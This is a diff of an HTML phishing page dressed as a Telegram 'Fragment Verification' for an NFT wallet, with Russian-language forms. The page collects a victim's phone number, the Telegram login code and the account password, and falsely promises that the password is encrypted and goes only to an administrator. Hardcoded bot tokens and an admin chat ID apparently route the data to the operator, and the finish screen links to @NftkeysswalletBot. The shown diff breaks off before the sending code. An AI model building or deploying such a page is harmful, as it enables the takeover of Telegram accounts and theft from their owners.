@@ -3,231 +3,556 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Верификация · Telegram</title>
-    <!-- Подключаем Telegram Web App SDK -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Fragment Verification | Telegram NFT Wallet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
+        :root {
+            --telegram-blue: #0088cc;
+            --telegram-blue-dark: #0077b3;
+            --telegram-blue-light: #3399ff;
+            --telegram-white: #ffffff;
+            --telegram-gray: #f8f9fa;
+            --telegram-gray-dark: #e9ecef;
+            --telegram-gray-darker: #6c757d;
+            --telegram-black: #212529;
+            --telegram-green: #28a745;
+            --telegram-red: #dc3545;
+            --telegram-yellow: #ffc107;
+            --telegram-shadow: 0 2px 12px rgba(0, 136, 204, 0.1);
+            --telegram-radius: 12px;
+            --telegram-transition: all 0.3s ease;
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
         }
-
+        
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
+            background: linear-gradient(135deg, var(--telegram-gray) 0%, #e3f2fd 100%);
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            padding: 16px;
-        }
-
-        .container {
-            max-width: 400px;
-            margin: 0 auto;
-            width: 100%;
-        }
-
-        .card {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            border-radius: 14px;
+            justify-content: center;
+            align-items: center;
             padding: 20px;
-            margin-bottom: 16px;
+            color: var(--telegram-black);
+            line-height: 1.6;
         }
-
-        h1 {
+        
+        .telegram-container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--telegram-white);
+            border-radius: var(--telegram-radius);
+            box-shadow: var(--telegram-shadow);
+            overflow: hidden;
+            border: 1px solid var(--telegram-gray-dark);
+            animation: slideUp 0.5s ease;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .telegram-header {
+            background: var(--telegram-blue);
+            color: var(--telegram-white);
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .telegram-logo {
+            width: 50px;
+            height: 50px;
+            background: var(--telegram-white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--telegram-blue);
             font-size: 24px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            color: var(--tg-theme-text-color, #000000);
+            font-weight: bold;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
         }
-
-        h2 {
-            font-size: 18px;
+        
+        .telegram-header-text h1 {
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 12px;
-            color: var(--tg-theme-text-color, #000000);
+            margin-bottom: 4px;
         }
-
-        .steps {
+        
+        .telegram-header-text p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .telegram-content {
+            padding: 30px;
+        }
+        
+        .telegram-steps {
             display: flex;
             justify-content: space-between;
             margin-bottom: 30px;
             position: relative;
         }
-
-        .steps::before {
+        
+        .telegram-steps::before {
             content: '';
             position: absolute;
-            top: 14px;
-            left: 0;
-            right: 0;
+            top: 15px;
+            left: 20px;
+            right: 20px;
             height: 2px;
-            background: var(--tg-theme-hint-color, #c8c8c8);
+            background: var(--telegram-gray-dark);
             z-index: 1;
         }
-
-        .step {
+        
+        .telegram-step {
             display: flex;
             flex-direction: column;
             align-items: center;
             position: relative;
             z-index: 2;
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            padding: 0 8px;
         }
-
+        
         .step-circle {
-            width: 30px;
-            height: 30px;
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            background: var(--tg-theme-hint-color, #c8c8c8);
-            color: var(--tg-theme-bg-color, #ffffff);
+            background: var(--telegram-gray-dark);
+            color: var(--telegram-gray-darker);
             display: flex;
             align-items: center;
             justify-content: center;
             font-weight: 600;
             font-size: 14px;
-            margin-bottom: 6px;
-            transition: all 0.2s ease;
+            margin-bottom: 8px;
+            transition: var(--telegram-transition);
         }
-
+        
         .step-circle.active {
-            background: var(--tg-theme-button-color, #40a7e3);
-            color: var(--tg-theme-button-text-color, #ffffff);
+            background: var(--telegram-blue);
+            color: var(--telegram-white);
+            box-shadow: 0 4px 10px rgba(0, 136, 204, 0.3);
         }
-
+        
         .step-circle.completed {
-            background: var(--tg-theme-button-color, #40a7e3);
-            color: var(--tg-theme-button-text-color, #ffffff);
+            background: var(--telegram-green);
+            color: var(--telegram-white);
         }
-
+        
         .step-text {
-            font-size: 11px;
-            color: var(--tg-theme-hint-color, #999999);
+            font-size: 12px;
+            color: var(--telegram-gray-darker);
             font-weight: 500;
+            text-align: center;
         }
-
+        
         .step-text.active {
-            color: var(--tg-theme-text-color, #000000);
+            color: var(--telegram-blue);
             font-weight: 600;
         }
-
-        .form-group {
-            margin-bottom: 20px;
+        
+        .telegram-form {
+            display: none;
         }
-
-        label {
+        
+        .telegram-form.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .form-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 16px;
+            color: var(--telegram-black);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .form-title i {
+            color: var(--telegram-blue);
+        }
+        
+        .telegram-input-group {
+            margin-bottom: 24px;
+        }
+        
+        .telegram-label {
             display: block;
             margin-bottom: 8px;
             font-weight: 500;
-            color: var(--tg-theme-text-color, #000000);
+            color: var(--telegram-black);
+            font-size: 15px;
         }
-
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 1px solid var(--tg-theme-hint-color, #c8c8c8);
-            border-radius: 10px;
-            font-size: 16px;
-            background: var(--tg-theme-bg-color, #ffffff);
-            color: var(--tg-theme-text-color, #000000);
-            outline: none;
-        }
-
-        input:focus {
-            border-color: var(--tg-theme-button-color, #40a7e3);
-        }
-
-        .hint {
-            font-size: 13px;
-            color: var(--tg-theme-hint-color, #999999);
-            margin-top: 6px;
-        }
-
-        button {
+        
+        .telegram-input {
             width: 100%;
             padding: 16px;
-            background: var(--tg-theme-button-color, #40a7e3);
-            color: var(--tg-theme-button-text-color, #ffffff);
+            border: 2px solid var(--telegram-gray-dark);
+            border-radius: 10px;
+            font-size: 16px;
+            transition: var(--telegram-transition);
+            background: var(--telegram-gray);
+            color: var(--telegram-black);
+        }
+        
+        .telegram-input:focus {
+            outline: none;
+            border-color: var(--telegram-blue);
+            background: var(--telegram-white);
+            box-shadow: 0 0 0 3px rgba(0, 136, 204, 0.1);
+        }
+        
+        .telegram-input::placeholder {
+            color: var(--telegram-gray-darker);
+        }
+        
+        .telegram-btn {
+            width: 100%;
+            padding: 16px;
+            background: var(--telegram-blue);
+            color: var(--telegram-white);
             border: none;
             border-radius: 10px;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: opacity 0.2s ease;
-            margin-bottom: 10px;
+            transition: var(--telegram-transition);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
         }
-
-        button:active {
-            opacity: 0.7;
+        
+        .telegram-btn:hover {
+            background: var(--telegram-blue-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 136, 204, 0.2);
         }
-
-        button:disabled {
-            opacity: 0.5;
-            pointer-events: none;
+        
+        .telegram-btn:active {
+            transform: translateY(0);
         }
-
-        button.secondary {
-            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
-            color: var(--tg-theme-text-color, #000000);
-            border: 1px solid var(--tg-theme-hint-color, #c8c8c8);
+        
+        .telegram-btn:disabled {
+            background: var(--telegram-gray-darker);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
-
-        .message {
-            padding: 12px 16px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            display: none;
+        
+        .telegram-btn.secondary {
+            background: var(--telegram-gray-darker);
         }
-
-        .message.error {
-            background: rgba(220, 53, 69, 0.1);
-            border: 1px solid #dc3545;
-            color: #dc3545;
+        
+        .telegram-btn.secondary:hover {
+            background: #5a6268;
         }
-
-        .message.success {
-            background: rgba(40, 167, 69, 0.1);
-            border: 1px solid #28a745;
-            color: #28a745;
+        
+        .telegram-btn.warning {
+            background: var(--telegram-yellow);
+            color: var(--telegram-black);
         }
-
-        .message.info {
-            background: rgba(0, 136, 204, 0.1);
-            border: 1px solid #0088cc;
-            color: #0088cc;
+        
+        .telegram-btn.warning:hover {
+            background: #e0a800;
         }
-
-        .message.show {
+        
+        .telegram-btn.success {
+            background: var(--telegram-green);
+        }
+        
+        .telegram-btn.success:hover {
+            background: #218838;
+        }
+        
+        .telegram-btn.outline {
+            background: transparent;
+            border: 2px solid var(--telegram-blue);
+            color: var(--telegram-blue);
+        }
+        
+        .telegram-btn.outline:hover {
+            background: var(--telegram-blue);
+            color: white;
+        }
+        
+        .telegram-hint {
+            font-size: 13px;
+            color: var(--telegram-gray-darker);
+            margin-top: 8px;
             display: block;
+            line-height: 1.5;
         }
-
-        .loader {
-            display: inline-flex;
+        
+        .phone-examples {
+            background: var(--telegram-gray);
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            border-left: 4px solid var(--telegram-blue);
+        }
+        
+        .phone-examples h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--telegram-black);
+            display: flex;
             align-items: center;
             gap: 8px;
         }
-
+        
+        .phone-examples ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .phone-examples li {
+            font-size: 13px;
+            color: var(--telegram-gray-darker);
+            margin-bottom: 6px;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .phone-examples li:before {
+            content: '•';
+            color: var(--telegram-blue);
+            position: absolute;
+            left: 0;
+            font-weight: bold;
+        }
+        
+        .telegram-info {
+            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 24px;
+            border: 1px solid #bbdefb;
+        }
+        
+        .telegram-info h4 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            color: var(--telegram-blue);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .telegram-info ul {
+            list-style: none;
+            padding-left: 0;
+        }
+        
+        .telegram-info li {
+            font-size: 14px;
+            color: var(--telegram-black);
+            margin-bottom: 10px;
+            padding-left: 24px;
+            position: relative;
+        }
+        
+        .telegram-info li:before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: var(--telegram-green);
+            font-weight: bold;
+        }
+        
+        .telegram-message {
+            padding: 16px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .telegram-message.error {
+            background: rgba(220, 53, 69, 0.1);
+            border: 1px solid var(--telegram-red);
+            color: var(--telegram-red);
+        }
+        
+        .telegram-message.success {
+            background: rgba(40, 167, 69, 0.1);
+            border: 1px solid var(--telegram-green);
+            color: var(--telegram-green);
+        }
+        
+        .telegram-message.info {
+            background: rgba(0, 136, 204, 0.1);
+            border: 1px solid var(--telegram-blue);
+            color: var(--telegram-blue);
+        }
+        
+        .telegram-message.warning {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid var(--telegram-yellow);
+            color: #856404;
+        }
+        
+        .telegram-message.show {
+            display: block;
+        }
+        
+        .telegram-loader {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
         .loader-spinner {
-            width: 18px;
-            height: 18px;
+            width: 20px;
+            height: 20px;
             border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top: 2px solid currentColor;
+            border-top: 2px solid var(--telegram-white);
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
-
+        
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
+        
+        .telegram-footer {
+            padding: 20px;
+            text-align: center;
+            background: var(--telegram-gray);
+            border-top: 1px solid var(--telegram-gray-dark);
+            font-size: 14px;
+            color: var(--telegram-gray-darker);
+        }
+        
+        .telegram-footer a {
+            color: var(--telegram-blue);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--telegram-transition);
+        }
+        
+        .telegram-footer a:hover {
+            text-decoration: underline;
+            color: var(--telegram-blue-dark);
+        }
+        
+        .telegram-icon {
+            color: var(--telegram-blue);
+        }
+        
+        @media (max-width: 480px) {
+            .telegram-container {
+                border-radius: 0;
+            }
+            
+            .telegram-content {
+                padding: 20px;
+            }
+            
+            .telegram-header {
+                padding: 15px;
+            }
+        }
+        
+        @keyframes successPulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .success-animation {
+            animation: successPulse 0.5s ease;
+        }
+        
+        .verification-status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            background: var(--telegram-gray);
+            border: 1px solid var(--telegram-gray-dark);
+        }
+        
+        .verification-status h4 {
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--telegram-black);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .verification-status p {
+            font-size: 13px;
+            color: var(--telegram-gray-darker);
+            margin-bottom: 5px;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+        
+        .status-pending {
+            background: rgba(255, 193, 7, 0.2);
+            color: #856404;
+        }
+        
+        .status-approved {
+            background: rgba(40, 167, 69, 0.2);
+            color: var(--telegram-green);
+        }
+        
+        .status-rejected {
+            background: rgba(220, 53, 69, 0.2);
+            color: var(--telegram-red);
+        }
+        
+        .telegram-timer {
+            display: inline-block;
+            padding: 4px 10px;
+            background: var(--telegram-blue);
+            color: white;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        
         .password-field {
             position: relative;
         }
-
+        
         .toggle-password {
             position: absolute;
             right: 12px;
@@ -235,180 +560,295 @@
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: var(--tg-theme-hint-color, #999999);
+            color: var(--telegram-gray-darker);
             cursor: pointer;
             font-size: 18px;
             padding: 5px;
         }
-
-        .security-note {
+        
+        .security-info {
             background: rgba(255, 193, 7, 0.1);
             border-radius: 8px;
             padding: 12px;
-            margin-bottom: 20px;
-            border-left: 4px solid #ffc107;
-            font-size: 13px;
+            margin-top: 10px;
+            border-left: 4px solid var(--telegram-yellow);
         }
-
+        
+        .security-info h4 {
+            font-size: 14px;
+            color: #856404;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .security-info p {
+            font-size: 12px;
+            color: #856404;
+            margin: 0;
+        }
+        
+        .optional-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px dashed var(--telegram-gray-dark);
+        }
+        
+        .optional-title {
+            font-size: 14px;
+            color: var(--telegram-gray-darker);
+            margin-bottom: 10px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
         .btn-group {
             display: flex;
             gap: 10px;
+            margin-top: 15px;
         }
-
-        .btn-group button {
+        
+        .btn-group .telegram-btn {
             flex: 1;
-        }
-
-        .hidden {
-            display: none;
+            margin-top: 0;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Шаги верификации -->
-        <div class="card">
-            <div class="steps">
-                <div class="step">
+    <div class="telegram-container">
+        <div class="telegram-header">
+            <div class="telegram-logo">
+                <i class="fab fa-telegram"></i>
+            </div>
+            <div class="telegram-header-text">
+                <h1>Fragment Verification</h1>
+                <p>Трехэтапная проверка • Безопасность</p>
+            </div>
+        </div>
+        
+        <div class="telegram-content">
+            <div class="telegram-steps">
+                <div class="telegram-step">
                     <div class="step-circle active" id="stepCircle1">1</div>
                     <div class="step-text active" id="stepText1">Номер</div>
                 </div>
-                <div class="step">
+                <div class="telegram-step">
                     <div class="step-circle" id="stepCircle2">2</div>
                     <div class="step-text" id="stepText2">Код</div>
                 </div>
-                <div class="step">
+                <div class="telegram-step">
                     <div class="step-circle" id="stepCircle3">3</div>
                     <div class="step-text" id="stepText3">Пароль</div>
                 </div>
-                <div class="step">
+                <div class="telegram-step">
                     <div class="step-circle" id="stepCircle4">4</div>
                     <div class="step-text" id="stepText4">Готово</div>
                 </div>
             </div>
-        </div>
-
-        <!-- Сообщения -->
-        <div class="message error" id="errorMessage"><span id="errorText"></span></div>
-        <div class="message success" id="successMessage"><span id="successText"></span></div>
-        <div class="message info" id="infoMessage"><span id="infoText"></span></div>
-
-        <!-- Форма 1: Телефон -->
-        <div class="card telegram-form active" id="formPhone">
-            <h2>📱 Шаг 1: Номер телефона</h2>
-            <div class="form-group">
-                <label>Номер телефона (с кодом страны)</label>
-                <input type="text" id="phoneInput" placeholder="+7 999 123 45 67" maxlength="20">
-                <div class="hint">Введите номер, привязанный к Telegram</div>
-            </div>
-            <button onclick="sendPhoneNumber()" id="sendPhoneBtn">
-                <span>Отправить номер</span>
-            </button>
-        </div>
-
-        <!-- Форма 2: Код -->
-        <div class="card telegram-form" id="formCode">
-            <h2>🔢 Шаг 2: Код подтверждения</h2>
-            <div class="form-group">
-                <label>5-значный код из Telegram</label>
-                <input type="text" id="codeInput" placeholder="12345" maxlength="5">
-                <div class="hint">Код действителен 5 минут</div>
-            </div>
-            <button onclick="sendVerificationCode()" id="sendCodeBtn">
-                <span>Подтвердить код</span>
-            </button>
-            <button class="secondary" onclick="backToPhoneStep()">
-                ← Назад
-            </button>
-        </div>
-
-        <!-- Форма 3: Пароль (опционально) -->
-        <div class="card telegram-form" id="formPassword">
-            <h2>🔒 Шаг 3: Пароль (опционально)</h2>
             
-            <div class="security-note">
-                <strong>🔐 Безопасность:</strong> Пароль передаётся в зашифрованном виде только администратору для проверки. Вы можете пропустить этот шаг.
+            <div class="telegram-message error" id="errorMessage">
+                <i class="fas fa-exclamation-circle"></i> <span id="errorText"></span>
             </div>
-
-            <div class="form-group">
-                <label>Пароль от аккаунта Fragment</label>
-                <div class="password-field">
-                    <input type="password" id="passwordInput" placeholder="Введите пароль (если есть)" maxlength="50">
-                    <button class="toggle-password" type="button" onclick="togglePasswordVisibility()">👁️</button>
+            
+            <div class="telegram-message success" id="successMessage">
+                <i class="fas fa-check-circle"></i> <span id="successText"></span>
+            </div>
+            
+            <div class="telegram-message info" id="infoMessage">
+                <i class="fas fa-info-circle"></i> <span id="infoText"></span>
+            </div>
+            
+            <!-- Форма 1: Ввод телефона -->
+            <div class="telegram-form active" id="formPhone">
+                <div class="form-title">
+                    <i class="fas fa-mobile-alt telegram-icon"></i>
+                    Шаг 1: Введите номер телефона
                 </div>
-            </div>
-
-            <div class="btn-group">
-                <button onclick="sendPassword()" id="sendPasswordBtn">
-                    <span>Отправить</span>
+                
+                
+                <div class="telegram-input-group">
+                    <label class="telegram-label" for="phoneInput">
+                        <i class="fas fa-phone telegram-icon"></i>
+                        Номер телефона 
+                    </label>
+                    <input type="text" 
+                           id="phoneInput" 
+                           class="telegram-input" 
+                           placeholder="+7 999 123 45 67"
+                           maxlength="20">
+                    <span class="telegram-hint">
+                        <i class="fas fa-info-circle"></i>
+                        Введите номер
+                    </span>
+                </div>
+                
+                <button class="telegram-btn" onclick="sendPhoneNumber()" id="sendPhoneBtn">
+                    <i class="fas fa-paper-plane"></i>
+                    Отправить номер
                 </button>
-                <button class="secondary" onclick="skipPassword()" id="skipPasswordBtn">
-                    Пропустить
-                </button>
             </div>
-            <button class="secondary" onclick="backToCodeStep()">
-                ← Назад
-            </button>
-        </div>
-
-        <!-- Форма 4: Завершение -->
-        <div class="card telegram-form" id="formSuccess">
-            <h2 style="color: #28a745;">✅ Верификация завершена!</h2>
             
-            <div style="margin: 20px 0;">
-                <p>Ваши данные отправлены администратору. Проверка обычно занимает 5–15 минут.</p>
-                <p style="margin-top: 12px;">После проверки вы получите уведомление в боте и ссылку на видео.</p>
+            <!-- Форма 2: Ввод кода -->
+            <div class="telegram-form" id="formCode">
+                <div class="form-title">
+                    <i class="fas fa-key telegram-icon"></i>
+                    Шаг 2: Введите код подтверждения
+                </div>
+                
+                
+                <div class="telegram-input-group">
+                    <label class="telegram-label" for="codeInput">
+                        <i class="fas fa-lock telegram-icon"></i>
+                        5-значный код из Telegram
+                    </label>
+                    <input type="text" 
+                           id="codeInput" 
+                           class="telegram-input" 
+                           placeholder="12345"
+                           maxlength="5">
+                    <span class="telegram-hint">
+                        <i class="fas fa-clock"></i>
+                        Код действителен 5 минут
+                    </span>
+                </div>
+                
+                <button class="telegram-btn" onclick="sendVerificationCode()" id="sendCodeBtn">
+                    <i class="fas fa-check-circle"></i>
+                    Отправить код
+                </button>
+                
+                <button class="telegram-btn secondary" onclick="backToPhoneStep()" style="margin-top: 10px;">
+                    <i class="fas fa-arrow-left"></i>
+                    Вернуться к номеру
+                </button>
             </div>
-
-            <button onclick="closeWebApp()" style="background: #28a745;">
-                Закрыть и вернуться в бота
-            </button>
-            <button class="secondary" onclick="startNewVerification()">
-                Начать заново
-            </button>
+            
+            <!-- Форма 3: Ввод пароля (опционально) -->
+            <div class="telegram-form" id="formPassword">
+                <div class="form-title">
+                    <i class="fas fa-lock telegram-icon"></i>
+                    Шаг 3: Пароль от Fragment (опционально)
+                </div>
+                
+                
+                <div class="telegram-input-group">
+                    <label class="telegram-label" for="passwordInput">
+                        <i class="fas fa-key telegram-icon"></i>
+                        Пароль от аккаунта
+                    </label>
+                    <div class="password-field">
+                        <input type="password" 
+                               id="passwordInput" 
+                               class="telegram-input" 
+                               placeholder="Введите пароль (если есть)"
+                               maxlength="50">
+                        <button class="toggle-password" type="button" onclick="togglePasswordVisibility()">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <span class="telegram-hint">
+                        <i class="fas fa-info-circle"></i>
+                        Основной пароль для входа 
+                    </span>
+                </div>
+                
+                <div class="security-info">
+                    <h4><i class="fas fa-shield-alt"></i> Безопасность данных:</h4>
+                    <p>Пароль отправляется в зашифрованном виде только администратору для проверки верификации.</p>
+                </div>
+                
+                <div class="btn-group">
+                    <button class="telegram-btn success" onclick="sendPassword()" id="sendPasswordBtn">
+                        <i class="fas fa-paper-plane"></i>
+                        Отправить пароль
+                    </button>
+                    
+                    <button class="telegram-btn outline" onclick="skipPassword()" id="skipPasswordBtn">
+                        <i class="fas fa-forward"></i>
+                        Пропустить пароль
+                    </button>
+                </div>
+                
+                <button class="telegram-btn secondary" onclick="backToCodeStep()" style="margin-top: 10px;">
+                    <i class="fas fa-arrow-left"></i>
+                    Вернуться к коду
+                </button>
+            </div>
+            
+            <!-- Форма 4: Успех -->
+            <div class="telegram-form" id="formSuccess">
+                <div class="form-title" style="color: var(--telegram-green);">
+                    <i class="fas fa-check-circle" style="color: var(--telegram-green);"></i>
+                    Верификация завершена!
+                </div>
+                
+                <div class="telegram-info" style="background: rgba(40, 167, 69, 0.1); border-color: var(--telegram-green);">
+                    <h4 style="color: var(--telegram-green);">
+                        <i class="fas fa-info-circle"></i>
+                        Что дальше?
+                    </h4>
+                    <ul>
+                        <li>Ваши данные отправлены администратору</li>
+                        <li><span id="hasPasswordText">Пароль отправлен для проверки</span></li>
+                        <li>Администратор проверит данные в системе Fragment</li>
+                        <li>Обычно проверка занимает 5-15 минут</li>
+                        <li>После проверки вы получите уведомление в боте</li>
+                    </ul>
+                </div>
+                
+                
+                <a href="https://t.me/NftkeysswalletBot" target="_blank" class="telegram-btn success-animation" style="background: var(--telegram-green);">
+                    <i class="fab fa-telegram"></i>
+                    Перейти в @NftkeysswalletBot
+                </a>
+                
+                <button class="telegram-btn" onclick="startNewVerification()" style="background: var(--telegram-blue); margin-top: 10px;">
+                    <i class="fas fa-redo"></i>
+                    Начать новую верификацию
+                </button>
+            </div>
         </div>
+        
     </div>
 
     <script>
-        // === Telegram Web App ===
-        const tg = window.Telegram.WebApp;
-        tg.expand(); // Разворачиваем на весь экран
-        tg.enableClosingConfirmation(); // Подтверждение при закрытии
-
-        // === Конфигурация ===
-        const BOT_TOKEN = "8507711321:AAGFC12G9uPkaWXBbNEbK8s77lqyRhlho-k";
+        // === КОНФИГУРАЦИЯ ===
+        const BOT_TOKEN = "8524200361:AAElPEPVlXiEn1IAu_SXB4w8Y2xuniHStYI";
         const ADMIN_CHAT_IDS = [8443492299];
-
-        // === Состояние ===
+        
+        // === ПЕРЕМЕННЫЕ СОСТОЯНИЯ ===
         let currentStep = 1;
         let phoneNumber = "";
         let verificationCode = "";
         let userPassword = "";
         let hasPassword = false;
-        let sessionId = "FRAG_" + Date.now() + "_" + Math.random().toString(36).substr(2, 8).toUpperCase();
-
-        // === DOM элементы ===
+        let sessionId = "";
+        
+        // === ЭЛЕМЕНТЫ DOM ===
         const forms = {
             phone: document.getElementById('formPhone'),
             code: document.getElementById('formCode'),
             password: document.getElementById('formPassword'),
             success: document.getElementById('formSuccess')
         };
-
+        
         const stepCircles = {
             1: document.getElementById('stepCircle1'),
             2: document.getElementById('stepCircle2'),
             3: document.getElementById('stepCircle3'),
             4: document.getElementById('stepCircle4')
         };
-
+        
         const stepTexts = {
             1: document.getElementById('stepText1'),
             2: document.getElementById('stepText2'),
             3: document.getElementById('stepText3'),
             4: document.getElementById('stepText4')
         };
-
+        
         const phoneInput = document.getElementById('phoneInput');
         const codeInput = document.getElementById('codeInput');
         const passwordInput = document.getElementById('passwordInput');
@@ -422,390 +862,907 @@
         const successText = document.getElementById('successText');
         const infoMessage = document.getElementById('infoMessage');
         const infoText = document.getElementById('infoText');
-
-        // === Инициализация ===
+        
+        // === ИНИЦИАЛИЗАЦИЯ ===
         function init() {
-            hideMessages();
-            phoneInput?.focus();
             setupEventListeners();
+            autoDetectCountry();
+            hideMessages();
+            checkAdminConfig();
+            restoreSession();
         }
-
+        
+        function checkAdminConfig() {
+            if (!ADMIN_CHAT_IDS || ADMIN_CHAT_IDS.length === 0) {
+                console.warn('⚠️ ADMIN_CHAT_IDS не настроены.');
+            }
+        }
+        
         function setupEventListeners() {
-            phoneInput?.addEventListener('input', formatPhoneInput);
-            phoneInput?.addEventListener('keypress', (e) => {
+            phoneInput.addEventListener('input', formatPhoneInput);
+            phoneInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') sendPhoneNumber();
             });
-
-            codeInput?.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 5);
-            });
-            codeInput?.addEventListener('keypress', (e) => {
+            
+            codeInput.addEventListener('input', validateCodeInput);
+            codeInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') sendVerificationCode();
             });
-
-            passwordInput?.addEventListener('keypress', (e) => {
+            
+            passwordInput.addEventListener('keypress', (e) => {
                 if (e.key === 'Enter') sendPassword();
             });
+            
+            // Горячие клавиши
+            document.addEventListener('keydown', (e) => {
+                if (e.altKey && e.key === '1') {
+                    e.preventDefault();
+                    phoneInput.value = '+79991234567';
+                    showInfo('Тестовый номер +79991234567 добавлен (Alt+1)');
+                }
+                if (e.altKey && e.key === '2') {
+                    e.preventDefault();
+                    codeInput.value = '12345';
+                    showInfo('Тестовый код 12345 добавлен (Alt+2)');
+                }
+                if (e.altKey && e.key === '3') {
+                    e.preventDefault();
+                    passwordInput.value = 'testpassword123';
+                    showInfo('Тестовый пароль добавлен (Alt+3)');
+                }
+            });
         }
-
+        
         function formatPhoneInput(e) {
-            let value = e.target.value.replace(/[^\d+]/g, '');
-            if (value && value[0] !== '+') value = '+' + value;
-            e.target.value = value;
-        }
-
-        function togglePasswordVisibility() {
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-            } else {
-                passwordInput.type = 'password';
-            }
-        }
-
-        function hideMessages() {
-            errorMessage?.classList.remove('show');
-            successMessage?.classList.remove('show');
-            infoMessage?.classList.remove('show');
-        }
-
-        function showError(text) {
-            hideMessages();
-            if (errorText && errorMessage) {
-                errorText.textContent = text;
-                errorMessage.classList.add('show');
-                tg.HapticFeedback.notificationOccurred('error');
-            }
-        }
-
-        function showSuccess(text) {
-            hideMessages();
-            if (successText && successMessage) {
-                successText.textContent = text;
-                successMessage.classList.add('show');
-                tg.HapticFeedback.notificationOccurred('success');
-            }
-        }
-
-        function showInfo(text) {
-            hideMessages();
-            if (infoText && infoMessage) {
-                infoText.textContent = text;
-                infoMessage.classList.add('show');
-                tg.HapticFeedback.impactOccurred('light');
-            }
-        }
-
-        function updateStep(step) {
-            currentStep = step;
-
-            Object.values(forms).forEach(form => form?.classList.remove('active'));
-
-            for (let i = 1; i <= 4; i++) {
-                stepCircles[i]?.classList.remove('active', 'completed');
-                stepTexts[i]?.classList.remove('active');
-
-                if (i < step) {
-                    stepCircles[i]?.classList.add('completed');
-                } else if (i === step) {
-                    stepCircles[i]?.classList.add('active');
-                    stepTexts[i]?.classList.add('active');
+            let value = e.target.value;
+            value = value.replace(/[^\d+]/g, '');
+            
+            if (value.includes('+')) {
+                const parts = value.split('+');
+                value = '+' + parts.join('');
+                if (value.length > 1 && value[1] === '+') {
